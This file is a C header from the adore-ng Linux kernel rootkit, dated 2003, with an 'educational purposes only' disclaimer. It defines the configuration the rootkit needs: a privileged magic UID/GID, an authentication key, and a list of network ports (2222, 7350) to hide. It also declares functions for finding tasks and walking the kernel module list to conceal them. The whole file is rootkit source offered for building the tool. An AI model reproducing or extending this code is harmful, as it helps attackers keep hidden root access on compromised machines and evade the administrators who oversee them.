/*** (C) 2003 by Stealth -- http://stealth.7350.org
 ***	
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 *** Greets fly out to all my friends. You know who you are. :)
 *** Special thanks to Shivan for granting root access to his
 *** SMP box for adore-development. More thx to skyper for also
 *** granting root access.
 ***
 ***/
#ifndef __ADORE_NG_H__
#define __ADORE_NG_H__

/* to check whether request is legal */
#define PF_AUTH 0x1000000

#ifndef ELITE_UID
#error "No ELITE_UID given!"
#endif

#ifndef ELITE_GID
#error "No ELITE_GID given!"
#endif

#ifndef ADORE_KEY
#error "No ADORE_KEY given!"
#endif

#define ADORE_VERSION CURRENT_ADORE

/* Very old kernels don't have an equivalent macro... */
#define LinuxVersionCode(v, p, s) (((v)<<16)+((p)<<8)+(s))

u_short HIDDEN_SERVICES[] = 
	{2222, 7350, 0};

/* END CHANGE SECTION */

struct task_struct *adore_find_task(pid_t);

int adore_atoi(const char *);
extern struct module *module_list;

#ifdef LINUX26
#undef for_each_task
#define for_each_task for_each_process
#endif

#endif /* __ADORE_NG_H__ */
